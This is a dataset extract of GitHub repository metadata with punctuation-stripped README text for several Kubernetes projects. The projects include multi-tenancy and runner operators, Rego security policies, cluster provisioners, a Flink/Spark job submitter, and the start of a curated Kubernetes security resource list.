proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams gitops simple puml fmt svg Details There are different options when implementing GitOps Some of them are depicted bellow https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams gitops with image puml fmt svg CI Server writes image version to GitOps Repo https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams gitops with auto update puml fmt svg CI Server read only on GitOps Repo GitOps Operator writes image version to GitOps Repo https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams gitops with app repo puml fmt svg Infra as Code stays in app repo CI Server writes to GitOps repo,2020-04-09T15:05:35Z,2020-12-25T12:40:51Z,n/a,Organization,18,190,31,14,master,schnatterer,1,0,0,0,0,0,0
k8spin,k8spin-operator,hacktoberfest#k8spin#kopf#kubernetes#multi-tenancy#multi-tenant#operator,K8Spin Operator Build Status https action badges now sh k8spin k8spin operator License GPL v3 https img shields io badge License GPLv3 blue svg https www gnu org licenses gpl 3 0 Derek https alexellis o6s io badge repo k8spin operator owner k8spin https github com alexellis derek Twitter https img shields io twitter url https twitter com k8spin svg style social label Follow 20 40k8spin https twitter com k8spin Join the chat at https slack kubernetes io https img shields io badge style register green svg style social label Slack https slack kubernetes io Kubernetes multi tenant operator Enables multi tenant capabilities in your Kubernetes Cluster Logo docs logo png https k8spin cloud Features The main features included in the Operator Enable Multi Tenant Adds three new hierarchy concepts Organizations Tenants and Spaces Secure and scalable cluster management delegation Cluster Admins creates Organizations then delegating its access to users and groups Cluster budget management Assigning resources in the organization definition makes it possible to understand how many resources are allocated to a user team or the whole company Concepts K8Spin manages the multi tenant feature with three simple concepts Organization Created by a cluster administrator hosts tenants Cluster administrator can set compute quotas for the whole Organization and grant permissions to users and or groups Tenant A tenant can be created by an Organization administrator hosting spaces The Tenant administrator can fix compute quotas and assign roles to users and or groups Tenants resources should fit into Organization resources Space Tenant administrators can create Spaces Space is an abstraction layer on top of a Namespace A tenant administrator should assign quotas and roles to Space Space resources should fit into Tenant resources TLDR Clone this repo cd into it and Install with Helm 3 Take a look to the K8Spin helm chart documentation deployments helm k8spin operator README md bash Create a local cluster kind create cluster Deploy cert manager helm repo add jetstack https charts jetstack io helm repo update helm install cert manager jetstack cert manager version v1 0 6 set installCRDs true kubectl wait for condition Available deployment timeout 2m n cert manager all Deploy K8Spin operator export HELMEXPERIMENTALOCI 1 helm chart pull ghcr io k8spin k8spin operator chart v1 0 6 v1 0 6 Pulling from ghcr io k8spin k8spin operator chart ref ghcr io k8spin k8spin operator chart v1 0 6 name k8spin operator version v1 0 6 Status Downloaded newer chart for ghcr io k8spin k8spin operator chart v1 0 6 helm chart export ghcr io k8spin k8spin operator chart v1 0 6 helm install k8spin operator k8spin operator kubectl wait for condition Available deployment timeout 2m all Install with kubectl bash Create a local cluster kind create cluster Deploy cert manager kubectl apply f deployments kubernetes cert manager cert manager yaml kubectl wait for condition Available deployment timeout 2m n cert manager all Deploy K8Spin operator kubectl apply f deployments kubernetes crds n default kubectl apply f deployments kubernetes roles n default kubectl apply f deployments kubernetes n default kubectl wait for condition Available deployment timeout 2m n default all Now you are ready to use the operator bash kubectl apply f examples org 1 yaml organization k8spin cloud example created kubectl apply f examples tenant 1 yaml tenant k8spin cloud crm created kubectl apply f examples space 1 yaml space k8spin cloud dev created As cluster admin check organizations bash kubectl get org NAME AGE example 86s If you have installed the K8Spin kubectl plugin docs kubectl plugin md bash kubectl k8spin get org Name CPU Memory example 10 10Gi As example organization admin get available tenants bash kubectl get tenants n org example as Angel as group K8Spin cloud NAME AGE crm 7m31s As crm tenant admin get spaces bash kubectl get spaces n org example tenant crm as Angel as group K8Spin cloud NAME AGE dev 9m24s Run a workload in the dev space bash kubectl run nginx image nginxinc nginx unprivileged replicas 2 n org example tenant crm space dev as Angel as group K8Spin cloud pod nginx created Discover workloads in the dev space as space viewer bash kubectl get pods n org example tenant crm space dev as Pau NAME READY STATUS RESTARTS AGE nginx 1 1 Running 0 66s Documentation Discover all the power of this operator reading all the documentation docs Contributing We would love you to contribute to k8spin k8spin operator pull requests are welcome Please see the CONTRIBUTING md CONTRIBUTING md for more information Using k8spin at work or in production See ADOPTERS md ADOPTERS md for what companies are doing with k8spin today License The scripts and documentation in this project are released under the GNU GPLv3 LICENSE,2020-07-06T15:49:13Z,2020-12-27T13:29:19Z,Python,Organization,8,144,11,110,master,angelbarrera92#paurosello#renovate-bot#cmendible#isnuryusuf,5,13,17,7,11,1,16
southbridgeio,slurm-school-k8s,,slurm school k8s slurm io Kubernetes,2020-04-15T09:49:22Z,2020-12-23T13:43:45Z,Shell,Organization,45,120,68,27,master,IbraevM#LuckySB#ashvalov,3,0,0,0,0,0,0
fuluteam,ICH.Snowflake,,ICH Snowflake id net corek8s,2020-08-13T09:56:40Z,2020-12-28T09:34:17Z,C#,Organization,3,114,10,6,master,billsking,1,0,0,0,0,0,0
raspbernetes,k8s-security-policies,benchmark#cis#conftest#gatekeeper#kubernetes#open-policy-agent#raspbernetes#rego-files#rego-policy#security,Kubernetes Security Policies build https github com raspbernetes k8s security policies workflows build badge svg FOSSA Status https app fossa com api projects git 2Bgithub com 2Fraspbernetes 2Fk8s security policies svg type shield https app fossa com projects git 2Bgithub com 2Fraspbernetes 2Fk8s security policies ref badgeshield Introduction This repository provides a security policies library that is used for securing Kubernetes clusters configurations The security policies are created based on CIS Kubernetes benchmark https cloud google com kubernetes engine docs concepts cis benchmarks and rules defined in Kubesec io https kubesec io The policies are written in Rego a high level declarative language its purpose built for expressing policies over complex hierarchical data structures For detailed information on Rego see the Policy Language https www openpolicyagent org docs latest policy language documentation Structure of the repo The policies directory contains a list of folders which corresponds to the list of policies The folder is named with the benchmark standard and a number to differentiate with each other For example the 1 2 1 Ensure that the anonymous auth argument is set to false that in CIS benchmark is checked by the REGO files in directory CIS1 2 1 Check more on each policy in Policy Inventory policies POLICIES md Each of these folders contains a rego file and unit test rego file There is another lib folder which has two rego files that contain general functions that can be imported into other rego kubernetes rego contains functions and rules that will be used in security control rego files test rego contains functions that can be imported in the unit test files How does this work Violations Each of the rego policies checks against the manifests of resources that can be deployed in the K8s cluster the violation block in each policy rego files will normally contain these statements that will do Check what resource object the policy is checking against and return the object Check if the object violates that controls defined in the benchmark Display the error message if there is a violation Here is a quick example of a violation violation msg kubernetes pods pod not kubernetes containselement params allowedDeploymentsOrPods kubernetes name isautomountserviceaccounttokenenabled pod msg kubernetes format sprintf v v Automount Service account token must be set to false kubernetes kind kubernetes name The kubernetes indicates it is calling a function from kubernetes rego which put general functions The logic that specific to this control will be written in the same rego files Parameters For each of the security policies there will be parameters going to be used for checking against the resources The parameters can be from external for example if these policies are going to be checked in gatekeeper engine the parameters can be defined in the gatekeeper constraints or we can directly have default parameters in the file itself for standardizing the parameters that we will union these parameters params object union defaultparameters kubernetes parameters Unit tests To verify the correctness of the policies we use OPA testing framework https www openpolicyagent org docs v0 12 2 how do i test policies to write the unit tests Each unit tests will have test functions that need to start with the test in the function name so they can be picked by the op test the positive case start with the name of testnoviolation and negative starts with testviolation and tests with a policyinput that will be in the same structure of the manifests testviolation test violations violation with input as policyinput true testnoviolation test noviolations violation with input as policyinput false The unit tests files need to have the same package as the rego policy itself e g package cis525 will the package name for CIS 5 2 5 rego and CIS 5 2 5test rego so that the unit test will check the policy input against that violation block under the same package The opa test output indicates that all of the tests passed or not opa test policies v data specvolumeshostpathpathvarrundockersock testnoviolation PASS 318 786s data containersimagetag testviolation1 PASS 512 689s data containersimagetag testviolation2 PASS 515 964s data containersimagetag testnoviolation PASS 389 822s data containerssecuritycontextallowprivilegedeescalationtrue testviolation PASS 474 668s data containerssecuritycontextallowprivilegedeescalationtrue testnoviolation PASS 361 12s PASS 5 5 How this can be used The policy library is written in a standard way that can be used by various tools such as Conftest and Gatekeeper Gatekeeper The rego policies can be used as a schema in the gatekeeper ConstraintTemplate and constraints can be deployed based on the template onto the Kubernetes clusters for checking the CREATE and UPDATE operations against API server and gatekeeper also provides AUDIT functions for checking the existing resources against the constraints Check Gatekeeper https github com open policy agent gatekeeper to understand more how the constraints can be created Conftest Using conftest to check the structured yaml manifests files that will be deployed to your clusters Make srue you have installed Conftest Conftest https github com open policy agent conftest and run conftest test a yaml file agaist the policy library conftest test deployment yaml p policies all namespaces and the output will indicate if tests passed An example FAIL deployment yaml Containers must not run as root FAIL deployment yaml Deployments are not allowed 2 tests 0 passed 0 warnings 2 failure License FOSSA Status https app fossa com api projects git 2Bgithub com 2Fraspbernetes 2Fk8s security policies svg type large https app fossa com projects git 2Bgithub com 2Fraspbernetes 2Fk8s security policies ref badgelarge,2020-06-17T00:13:23Z,2020-12-29T00:52:56Z,Open Policy Agent,Organization,12,93,8,16,master,hsy3418#xUnholy#saurabhpandit#fossabot#renovate[bot],5,0,0,9,1,0,11
evryfs,github-actions-runner-operator,auto-scaling#automation#ci#cicd#github#github-actions#github-runner#k8s-operator#kubernetes#kubernetes-operator#runner-pod#runners#scaling#schedule-runners,GitHub go mod Go version https img shields io github go mod go version evryfs github actions runner operator Codacy Badge https api codacy com project badge Grade f31ef6cd50994eebb882389ec2ec37f1 https app codacy com gh evryfs github actions runner operator utmsource github com utmmedium referral utmcontent evryfs github actions runner operator utmcampaign BadgeGradeDashboard Go Report Card https goreportcard com badge github com evryfs github actions runner operator https goreportcard com report github com evryfs github actions runner operator build https github com evryfs github actions runner operator workflows build badge svg branch master codecov https codecov io gh evryfs github actions runner operator branch master graph badge svg https codecov io gh evryfs github actions runner operator GitHub release latest SemVer https img shields io github v release evryfs github actions runner operator sort semver Stargazers over time https starchart cc evryfs github actions runner operator svg https starchart cc evryfs github actions runner operator github actions runner operator K8s operator for scheduling github actions runner pods self hosted runners https help github com en actions hosting your own runners about self hosted runners is a way to host your own runners and customize the environment used to run jobs in your GitHub Actions workflows This operator helps you scale and schedule runners on demand in a declarative way Helm chart based install Helm3 chart is available from our existing helm repo https github com evryfs helm charts shell script helm repo add evryfs oss https evryfs github io helm charts kubectl create namespace github actions runner operator helm install github actions runner operator evryfs oss github actions runner operator namespace github actions runner operator CRD Declare a resource like in the example config samples garov1alpha1githubactionrunner yaml Weaknesses There is a theoretical possibility that a runner pod can be deleted while running a build if it is able to pick a build in the time between listing the api and doing the scaling logic development Operator is based on Operator SDK https github com operator framework operator sdk Kube builder https github com kubernetes sigs kubebuilder and written in Go,2020-04-17T22:36:28Z,2020-12-28T22:08:29Z,Go,Organization,3,92,11,233,master,davidkarlsen#dependabot[bot]#dependabot-preview[bot]#codacy-badger#MPV,5,14,19,9,34,4,100
Kubeinit,kubeinit,automation#cdk#eks#k8s#kubernetes#okd#rke,kubeinit README md,2020-07-30T10:59:01Z,2020-12-28T09:47:39Z,Python,Organization,11,88,32,319,master,ccamacho#yrobla#0xbboyd#cgoguyer#Bilal-io#gmarcy#jbadiapa,7,9,9,0,25,0,116
sighupio,gatekeeper-policy-manager,fury#gatekeeper#k8s#kubernetes#kustomize#opa#policies#rego,Gatekeeper Policy Manager GPM Build Status https ci sighup io api badges sighupio gatekeeper policy manager status svg https ci sighup io sighupio gatekeeper policy manager Gatekeeper Policy Manager is a simple read only web UI for viewing OPA Gatekeeper policies status in a Kubernetes Cluster It can display all the defined Constraint Templates with their rego code and all the Contraints with its current status violations enforcement action matches definitions etc Requirements You ll need OPA Gatekeeper running in your cluster and at least some constraint templates and constraints defined to take advantage of this tool You can easily deploy Gatekeeper to your cluster using the also open source Fury Kubernetes OPA https github com sighupio fury kubernetes opa module Deploying GPM To deploy Gatekeeper Policy Manager to your cluster apply the provided kustomization file running the following command shell kubectl apply k By default this will create a deployment and a service both with the name gatekeper policy manager in the gatekeeper system namespace We invite you to take a look into the kustomization yaml file to do further configuration The app can be run as a POD in a Kubernetes cluster or locally with a kubeconfig file It will try its best to autodetect the correct configuration Once you ve deployed the application if you haven t set up an ingress you can access the web UI using port forward bash kubectl n gatekeeper system port forward svc gatekeeper policy manager 8080 80 Then access it with your browser on http 127 0 0 1 8080 http 127 0 0 1 8080 Running locally GPM can also be run locally using docker and a kubeconfig assuming that the kubeconfig file you want to use is located at kube config the command to run GPM locally would be bash docker run v kube config root kube config p 8080 8080 quay io sighup gatekeeper policy manager v0 4 0 Then access it with your browser on http 127 0 0 1 8080 http 127 0 0 1 8080 You can also run the flask app directly see the development section for further information Configuration GPM is a stateless application but it can be configured using environment variables The possible configurations are Env Var Name Description Default GPMAUTHENABLED Enable Authentication current options Anonymous OIDC Anonymous GPMSECRETKEY The secret key used to generate tokens Change this value in production g8k1p3rp0l1c7m4n4g3r GPMPREFERREDURLSCHEME URL scheme to be used while generating links http GPMOIDCREDIRECTDOMAIN The server name under the app is being exposed This is where the client will be redirected after authenticating GPMOIDCISSUER OIDC Issuer hostname GPMOIDCAUTHORIZATIONENDPOINT OIDC Authorizatoin Endpoint GPMOIDCJWKSURI OIDC JWKS URI GPMOIDCTOKENENDPOINT OIDC TOKEN Endpoint GPMOIDCINTROSPECTIONENDPOINT OIDC Introspection Enpoint GPMOIDCUSERINFOENDPOINT OIDC Userinfo Endpoint GPMOIDCENDSESSIONENDPOINT OIDC End Session Endpoint GPMOIDCCLIENTID The Client ID used to authenticate against the OIDC Provider GPMOIDCCLIENTSECRET The Client Secret used to authenticate against the OIDC Provider GPMLOGLEVEL Log level see python logging docs https docs python org 2 library logging html levels for available levels INFO Please notice that OIDC Authentication is in beta state It has been tested to work with Keycloak as a provider These environment variables are already provided and ready to be set in the manifests enable oidc yaml manifests enable oidc yaml file Screenshots welcome screenshots 01 home png Constraint Templates view screenshots 02 constrainttemplates png Constraint Templates view rego code screenshots 03 constrainttemplates png Constraint view screenshots 04 constraints png Constraint view 2 screenshots 05 constraints png Constraint view 3 screenshots 06 constraints png Configurations view 2 screenshots 07 configs png Development GPM is written in Python using the Flask framework for the backend and Fromantic UI for the frontend To develop GPM you ll need to create a Python 3 virtual environment install all the dependencies specified in the provided requirements txt and you are good to start hacking The following commands should get you up and running bash Create a virtualenv python3 m venv env Activate it source env bin activate Install all the dependencies pip install r app requirements txt Run the development server FLASKAPP app app py flask run Access to a Kubernetes cluster with Gatekeeper deployed is recommended to debug the application You ll need an OIDC provider to test the OIDC authentication You can use our fury kubernetes keycloak https github com sighupio fury kubernetes keycloak module Roadmap The following is a wishlist of features that we would like to add to GPM in no particular order List the constraints that are currently using a ConstraintTemplate Polished OIDC authentication LDAP authentication Better syntax highlighting for the rego code snippets Root less docker image Multi cluster view Minimal write capabilities Re write app in Golang Please let us know if you are using GPM and what features would you like to have by creating an issue here in GitHub,2020-04-29T21:04:51Z,2020-12-29T03:14:18Z,HTML,Organization,6,88,6,224,master,ralgozino#renovate-bot#angelbarrera92#kg-ops,4,8,12,4,5,3,84
cnrancher,autok3s,alibaba#automation#k3s#k3s-cluster#k8s#kubernetes#tencent,autok3s Build Status http drone pandaria cnrancher com api badges cnrancher autok3s status svg http drone pandaria cnrancher com cnrancher autok3s Go Report Card https goreportcard com badge github com cnrancher autok3s https goreportcard com report github com cnrancher autok3s GitHub release https img shields io github v release cnrancher autok3s svg PRs Welcome https img shields io badge PRs welcome brightgreen svg color blue http github com cnrancher autok3s pulls English docs i18n zhcn README md AutoK3s is a lightweight tool for quickly creating and managing k3s clusters on multiple cloud providers It can help users quickly complete the personalized configuration of the k3s cluster while providing convenient kubectl access capabilities Key Features key features Providers providers Quick Start quick start Demo Video demo video Developers Guide developers guide License license Key Features Bootstrap Kubernetes with k3s onto multiple cloud providers with autok3s create Join nodes into an existing k3s cluster with autok3s join Automatically generate kubeconfig file for the cluster which you created Integrate kubectl to provide access to the cluster Bootstrap a HA Kubernetes with k3s cluster Support containerd private registry with registry flag Provide additional option to enable Kubernetes Cloud Controller Manager with cloud controller manager Provide additional option to enable Kubernetes Dashboard UI with ui Provide additional option to enable cloud platform s CNI plugin e g terway eni Providers See the providers links below for more usage details alibaba docs i18n enus alibaba README md Bootstrap Kubernetes with k3s onto Alibaba ECS tencent docs i18n enus tencent README md Bootstrap Kubernetes with k3s onto Tencent CVM native docs i18n enus native README md Bootstrap Kubernetes with k3s onto any VM Quick Start The following command use the alibaba provider with prerequisites that refer to the alibaba docs i18n enus alibaba README md document bash export ECSACCESSKEYID export ECSACCESSKEYSECRET autok3s d create p alibaba name myk3s master 1 worker 1 Demo Video The demo install Kubernetes k3s onto Alibaba ECS machines in around 1 minutes Watch the demo asciicast https asciinema org a EL5P2ILES8GAvdlhaxLMnY8Pg svg https asciinema org a EL5P2ILES8GAvdlhaxLMnY8Pg Developers Guide Use Makefile to manage project compilation testing and packaging Of course you can also choose to compile using dapper Install dapper please follow the dapper https github com rancher dapper project vendor GO111MODULE on go mod vendor compilation BY dapper make autok3s testing BY dapper make autok3s unit packing BY dapper make autok3s package only License Copyright c 2020 Rancher Labs Inc http rancher com Licensed under the Apache License Version 2 0 the License you may not use this file except in compliance with the License You may obtain a copy of the License at http www apache org licenses LICENSE 2 0 http www apache org licenses LICENSE 2 0 Unless required by applicable law or agreed to in writing software distributed under the License is distributed on an AS IS BASIS WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied See the License for the specific language governing permissions and limitations under the License,2020-07-29T05:13:34Z,2020-12-29T06:21:42Z,Go,Organization,3,78,8,189,master,Jason-ZW#NewGr8Player#JacieChao#smallteeths,4,8,8,36,49,2,123
kubealex,libvirt-k8s-provisioner,calico#containerd#cri-o#docker#flannel#k8s#k8s-cluster#kubeadm#kubectl#kubernetes#kubernetes-setup#nginx#rancher,License MIT https img shields io badge License MIT yellow svg https opensource org licenses MIT libvirt k8s provisioner Automate your cluster provisioning from 0 to k8s Welcome to the home of the project With this project you can build up in minutes a fully working k8s cluster single master HA with as many worker nodes as you want Kubernetes version that is installed is 1 19 6 Terraform will take care of the provisioning of Loadbalancer machine with haproxy installed and configured for HA clusters k8s Master s VM s k8s Worker s VM s It also takes care of preparing the host machine with needed packages configuring dedicated libvirt dnsmasq configuration dedicated libvirt network fully customizable dedicated libvirt storage pool fully customizable terraform libvirt terraform provider compiled and initialized based on https github com dmacvicar terraform provider libvirt https github com dmacvicar terraform provider libvirt You can customize the setup choosing container runtime that you want to use docker cri o containerd actually available schedulable master if you want to schedule on your master nodes or leave the taint service CIDR to be used during installation pod CIDR to be used during installation network plugin to be used based on the documentation Project Calico https www projectcalico org calico networking for kubernetes Flannel https github com coreos flannel nginx ingress controller https kubernetes github io ingress nginx or haproxy ingress controller https github com haproxytech kubernetes ingress if you want to enable ingress management Rancher https rancher com installation to manage your cluster metalLB https metallb universe tf to manage bare metal LoadBalancer services WIP Only L2 configuration can be set up via playbook Rook Ceph https rook io docs rook v1 4 ceph storage html WIP To be improved current rook ceph cluster size is 3 nodes All VMs are specular prepared with OS Centos7 Generic Cloud base image https cloud centos org centos 7 images https cloud centos org centos 7 images Centos8 Generic Cloud base image https cloud centos org centos 8 x8664 images https cloud centos org centos 8 x8664 images Ubuntu 20 04 LTS Cloud base image https cloud images ubuntu com releases focal release https cloud images ubuntu com releases focal release cloud init user kube pass kuberocks ssh key generated during vm provisioning and stores in the project folder The user is capable of logging via SSH too Quickstart The playbook is meant to be ran against a many local or remote host s defined under vmhost group depending on how many clusters you want to configure at once ansible playbook main yml You can quickly make it work by configuring the needed vars but you can go straight with the defaults Recommended sizings are Role vCPU RAM master 2 2G worker 1 1G vars k8scluster yml General configuration k8s clustername k8s test clusteros CentOS7 containerruntime crio masterschedulable false Nodes configuration controlplane vcpu 2 mem 2 vms 3 disk 30 workernodes vcpu 1 mem 2 vms 1 disk 30 Network configuration network networkcidr 192 168 200 0 24 domain k8s test podcidr 10 20 0 0 16 servicecidr 10 110 0 0 16 cniplugin calico Rook configuration rookceph installrook false volumesize 50 Ingress controller configuration nginx haproxy ingresscontroller installingresscontroller true type haproxy Section for Rancher setup rancher installrancher true Section for metalLB setup metallb installmetallb false manifesturl https raw githubusercontent com metallb metallb v0 9 5 manifests l2 iprange 192 168 200 210 192 168 200 250 Size for disk and mem is in GB disk allows to provision space in the cloud image for pod s ephemeral storage VMS are created with these names by default customizing them is work in progress clustername loadbalancer domain clustername master N domain clustername worker N domain It is possible to choose CentOS7 CentOS8 Ubunut as kubernetes hosts OS Rook Rook setup actually creates a dedicated kind of worker with an additional volume on ALL workers to be used It will be improved to just select a number of nodes that can be coherent with the number of ceph replicas Feel free to suggest modifications improvements Rancher Basic setup is made starting from Rancher documentation with Helm chart MetalLB Basic setup taken from the documentation At the moment the parameter l2 reports the IPs that can be used defaults to some IPs in the same subnet of the hosts as external IPs for accessing the applications Suggestion and improvements are highly recommended Alex,2020-05-22T21:36:43Z,2020-12-28T23:22:26Z,HCL,User,5,73,10,73,master,kubealex,1,2,2,0,11,0,3
todd5167,flink-spark-submiter,flink#k8s#spark#yarn,FlinkSparkJarJar IDEAFlinkSpark IDEAFlink Spark Flink yarnPerJobStandalone yarnSession SparkYarn ClusterYARNJarSpark JarsHDFS SparkK8s ClusterjarhiveHADOOPUSERNAMEHadoop Spark Yarn Submit Client spark yarn submiter src main java cn todd spark launcher LauncherMain java Spark K8s Submit Client spark k8s submiter src main java cn todd spark launcher LauncherMain java Flink Yarn Submit Client flink yarn submiter src main java cn todd flink launcher LauncherMain java Flink FlinkFlinkflink1 10 YarnSessionYarnPerjobStandaloneApplicationId exampleFlinkDemoexamplJars ApplicationIdjmtmURL Yarn public static JobParamsInfo buildJobParamsInfo System setProperty java security krb5 conf Users maqi tmp hadoopconf cdh514 krb5 conf jar String runJarPath Users maqi code ClustersSubmiter exampleJars flink kafka reader flink kafka reader jar String execArgs new String jobName flink110Submit topic mqTest01 bootstrapServers 172 16 8 107 9092 String jobName Flink perjob submit flink String flinkConfDir Users maqi tmp flink flink 1 10 0 conf flink lib String flinkJarPath Users maqi tmp flink flink 1 10 0 lib yarn String yarnConfDir Users maqi tmp hadoopconf 195 perjob String runMode yarnperjob String dependFile new String Users maqi tmp flink flink 1 10 0 README txt String queue c yarnsession appid Properties yarnSessionConfProperties new Properties yarnSessionConfProperties setProperty yid application15942655980975425 savepoint Properties confProperties new Properties confProperties setProperty parallelism 1 JobParamsInfo jobParamsInfo JobParamsInfo builder setExecArgs execArgs setName jobName setRunJarPath runJarPath setDependFile dependFile setFlinkConfDir flinkConfDir setYarnConfDir yarnConfDir setConfProperties confProperties setYarnSessionConfProperties yarnSessionConfProperties setFlinkJarPath flinkJarPath setQueue queue setRunMode runMode build return jobParamsInfo public static void main String args throws Exception JobParamsInfo jobParamsInfo buildJobParamsInfo job submit Optional appIdAndJobId submitFlinkJob jobParamsInfo running log info appIdAndJobId ifPresent pair printRollingLogBaseInfo jobParamsInfo pair cancel job Pair job new Pair application15942655980972688 35a679c9f94311a8a8084e4d8d06a95d cancelFlinkJob jobParamsInfo job flink job status ETaskStatus jobStatus getJobStatus jobParamsInfo new Pair application15942655980975425 fa4ae50441c5d5363e8abbe5623e115a System out println job status is jobStatus toString print finished Log printFinishedLog jobParamsInfo application15949617178910103 jobmanager aidl logs name jobmanager err totalBytes 555 url http 172 16 10 204 8042 node containerlogs containere1851593317332045224601000002 admin jobmanager err name jobmanager log totalBytes 31944 url http 172 16 10 204 8042 node containerlogs containere1851593317332045224601000002 admin jobmanager log name jobmanager out totalBytes 0 url http 172 16 10 204 8042 node containerlogs containere1851593317332045224601000002 admin jobmanager out typeName jobmanager taskmanager aidl logs name taskmanager err totalBytes 560 url http node03 8042 node containerlogs containere271593571725037017001000002 admin taskmanager err name taskmanager log totalBytes 35937 url http node03 8042 node containerlogs containere271593571725037017001000002 admin taskmanager log name taskmanager out totalBytes 0 url http node03 8042 node containerlogs containere271593571725037017001000002 admin taskmanager out otherInfo dataPort 36218 freeSlots 0 hardware cpuCores 4 freeMemory 241172480 managedMemory 308700779 physicalMemory 8201641984 id containere271593571725037017001000002 path akka tcp flink node03 36791 user taskmanager0 slotsNumber 1 timeSinceLastHeartbeat 1593659561129 typeName taskmanager Spark on yarn SparkYarn clusterSpark JarHDFSarchive SparkSQLexamplesspark sql proxyhive aidl public static void main String args throws Exception boolean openKerberos true String appName todd spark submit String runJarPath Users maqi code ClustersSubmiter exampleJars spark sql proxy spark sql proxy jar String mainClass cn todd spark SparksqlProxy String yarnConfDir Users maqi tmp hadoopconf String principal hdfs node1 DTSTACK COM String keyTab Users maqi tmp hadoopconf hdfs keytab String jarHdfsDir sparkproxy2 String archive hdfs nameservice1 sparkjars jars String queue root users hdfs String execArgs getExampleJobParams Properties confProperties new Properties confProperties setProperty spark executor cores 2 JobParamsInfo jobParamsInfo JobParamsInfo builder setAppName appName setRunJarPath runJarPath setMainClass mainClass setYarnConfDir yarnConfDir setPrincipal principal setKeytab keyTab setJarHdfsDir jarHdfsDir setArchivePath archive setQueue queue setExecArgs execArgs setConfProperties confProperties setOpenKerberos BooleanUtils toString openKerberos true false build YarnConfiguration yarnConf YarnConfLoaderUtil getYarnConf yarnConfDir String applicationId if BooleanUtils toBoolean openKerberos UserGroupInformation setConfiguration yarnConf UserGroupInformation userGroupInformation UserGroupInformation loginUserFromKeytabAndReturnUGI principal keyTab applicationId userGroupInformation doAs PrivilegedExceptionAction LauncherMain run jobParamsInfo yarnConf else LauncherMain run jobParamsInfo yarnConf System out println applicationId Spark on k8s Spark2 4 4spark sql proxy jarSparksqlHive HivehadoopConfDir xmlrootHive HADOOPUSERNAME kubeConfigKuberclient master url spark app selector id POD aidl public static void main String args throws Exception String appName todd spark submit jar String runJarPath local opt dtstack spark spark sql proxy jar String mainClass cn todd spark SparksqlProxy String hadoopConfDir Users maqi tmp hadoopconf String kubeConfig Users maqi tmp conf k8s config String imageName mqspark 2 4 4 String execArgs getExampleJobParams Properties confProperties new Properties confProperties setProperty spark executor instances 2 confProperties setProperty spark kubernetes namespace default confProperties setProperty spark kubernetes authenticate driver serviceAccountName spark confProperties setProperty spark kubernetes container image pullPolicy IfNotPresent JobParamsInfo jobParamsInfo JobParamsInfo builder setAppName appName setRunJarPath runJarPath setMainClass mainClass setExecArgs execArgs setConfProperties confProperties setHadoopConfDir hadoopConfDir setKubeConfig kubeConfig setImageName imageName build String id run jobParamsInfo System out println id,2020-06-11T09:52:19Z,2020-11-22T03:26:19Z,Java,User,0,72,24,25,master,todd5167#dependabot[bot],2,0,0,2,3,0,2
magnologan,awesome-k8s-security,,Awesome K8s Security A curated list for Awesome and Free Kubernetes Security resources Most of the resources are in English the ones that aren t will be flagged as such Disclaimer All the contents of this list are public and mostly free use them for educational purposes only Most of the tools have NOT been tested or reviewed use them at your own risk Also I don t consider myself a K8s Security expert I m just learning and helping others learn along with me Cheers The Basics To understand about Kubernetes Security you first need to understand how Kubernetes works and all the components involved Here s some links and materials to help you with that journey Official Pages Kubernetes io https kubernetes io Kubernetes GitHub https github com kubernetes kubernetes Blogs Kubernetes Getting Started https azure microsoft com en us overview kubernetes getting started Kubernetes 101 https www aquasec com resources kubernetes 101 Books Kubernetes Up and Running Second Edition by Brendan Burns Joe Beda and Kelsey Hightower https azure microsoft com en us resources kubernetes up and running Repos Kubernetes The Hard Way Kelsey Hightower https github com kelseyhightower kubernetes the hard way Kubernetes Challenge https github com hector vido kubernetes challenge pt BR Kubernetes de K a S https github com erlonpinheiro kubernetesdekas pt BR Kubernetes Training https github com ashishrpandey kubernetes training Trainings Introduction to Kubernetes https www edx org course introduction to kubernetes Kube Academy https kube academy Game of Pods KodeKloud https kodekloud com p game of pods Uncomplicating Kubernetes Jefferson Noronha aka LinuxTips https www youtube com watch v zz1p3gjyHgc pt BR Videos Talks Kubernetes in 5 mins https www youtube com watch v PH 2FfFD2PU Kubernetes Concepts Explained in 9 minutes https www youtube com watch v QJ4fODH6DXI Kubernetes Deconstructed Understanding Kubernetes by Breaking It Down Carson Anderson DOMO https www youtube com watch v 90kZRyPcRZw Podcasts Videocasts TGI Kubernetes https www youtube com playlist list PL7bmigfV0EqQzxcNpmcdTJ9eFRPBe iZa The Podlets https thepodlets io Kubernetes Security These are the main contents of this awesome list Everything related to the security of Kubernetes either breaking or improving it will be added down below If you have any other good recommendations feel free to submit a PR Official Pages Kubernetes Security and Disclosure Information https kubernetes io docs reference issues security security Cloud Native Security https kubernetes io docs concepts security overview Pod Security Standards https kubernetes io docs concepts security pod security standards CNCF Special Interest Group for Security SIG Security https github com cncf sig security CNCF Special Interest Group for Authorization Authentication and Cluster Security Policy SIG Auth https github com kubernetes community tree master sig auth Blogs Kubernetes Security https kubernetes security info Introducing Kubernetes Goat https blog madhuakula com introducing kubernetes goat 8624f6d70e9e Attack Matrix for Kubernetes https www microsoft com security blog 2020 04 02 attack matrix kubernetes Open Sourcing the Kubernetes Security Audit https www cncf io blog 2019 08 06 open sourcing the kubernetes security audit Amazon EKS Best Practices Guide for Security https aws github io aws eks best practices CVE 2018 18264 Privilege escalation through Kubernetes dashboard https sysdig com blog privilege escalation kubernetes dashboard Protecting Against Kubernetes Threats Chapter 1 Initial Access https www stackrox com post 2020 06 protecting against kubernetes threats chapter 1 initial access Guidance on Kubernetes Threat Modeling https www trendmicro com vinfo us security news virtualization and cloud guidance on kubernetes threat modeling Securing the 4Cs of Cloud Native https www trendmicro com vinfo us security news virtualization and cloud securing the 4 cs of cloud native systems cloud cluster container and code The Basics of Keeping Kubernetes Clusters Secure Part 1 https www trendmicro com vinfo us security news security technology the basics of keeping your kubernetes cluster secure part 1 Books Container Security by Liz Rice https containersecurity tech Kubernetes Security by Liz Rice and Michael Hausenblas https info aquasec com kubernetes security Papers Kubernetes Security Assessment https raw githubusercontent com kubernetes community master wg security audit findings Kubernetes 20Final 20Report pdf Kubernetes Security Whitepaper https raw githubusercontent com kubernetes community master wg security audit findings Kubernetes 20White 20Paper pdf Kubernetes Threat Model https raw githubusercontent com kubernetes community master wg 